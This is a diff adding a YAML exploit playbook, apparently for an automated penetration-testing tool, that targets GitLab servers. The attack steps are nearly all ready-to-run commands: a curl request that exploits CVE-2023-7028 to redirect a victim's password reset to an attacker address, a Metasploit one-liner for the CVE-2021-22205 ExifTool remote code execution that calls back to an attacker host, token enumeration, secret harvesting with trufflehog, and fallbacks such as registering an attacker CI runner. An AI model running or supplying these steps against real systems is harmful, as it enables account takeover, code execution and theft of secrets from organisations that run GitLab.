@@ -1,0 +1,42 @@
+id: tech_gitlab
+title: "GitLab — CVE-2021-22205 ExifTool RCE + CVE-2023-7028 password reset takeover"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["gitlab", "x-gitlab", "/users/sign_in", "/api/v4"]
+  cves:     ["CVE-2021-22205", "CVE-2023-7028", "CVE-2021-22214", "CVE-2022-2185"]
+keywords: ["gitlab", "exiftool", "djvu", "gitlab rce"]
+preconditions:
+  - "GitLab UI reachable (powered-by GitLab footer / x-gitlab-meta header)"
+steps:
+  - tool: curl
+    cmd:  "curl -s {base_url}/help | grep -oE 'GitLab (CE|EE) [0-9.]+'"
+    why:  "Version disclosure"
+  - tool: curl
+    cmd:  "curl -s {base_url}/api/v4/version"
+    why:  "API version (often unauth on older 13.x/14.x)"
+  - tool: curl
+    cmd:  "curl -s -k -X POST '{base_url}/users/password' --data-urlencode 'user[email][]=victim@target.tld' --data-urlencode 'user[email][]=attacker@my.tld'"
+    why:  "CVE-2023-7028 — password reset to attacker email via array bypass (GitLab 16.1.0-16.7.1)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/gitlab_exif_rce; set RHOSTS {target}; set RPORT {port}; set USERNAME {user}; set PASSWORD {pass}; set LHOST {LHOST}; run'"
+    why:  "CVE-2021-22205 — DjVu image upload triggers ExifTool RCE (auth required ≤13.10.2; UNauth ≤13.10.2 with self-registration)"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/api/v4/projects?private_token={token}' | jq '.[].path_with_namespace'"
+    why:  "Token enum — exposed CI/CD tokens often have full project read"
+  - tool: trufflehog
+    cmd:  "trufflehog gitlab --token={token} --endpoint={base_url}"
+    why:  "Hunt secrets in commit history once authenticated"
+  - tool: nuclei
+    cmd:  "nuclei -tags gitlab -u {base_url}"
+    why:  "Sweep all GitLab CVEs + path-traversal misconfigs"
+expected_outcome: "RCE as git user via DjVu upload; password reset takeover on CVE-2023-7028; secret harvest from CI/CD"
+fallbacks:
+  - "Self-registration enabled? → register → upload DjVu → RCE without prior creds"
+  - "Runner registration tokens leaked → register attacker runner → exec on shared infra"
+  - "GraphQL endpoint (/api/graphql) — unauth introspection often allowed"
+references:
+  - "https://about.gitlab.com/releases/categories/releases/"
+  - "https://hackerone.com/reports/1154542"
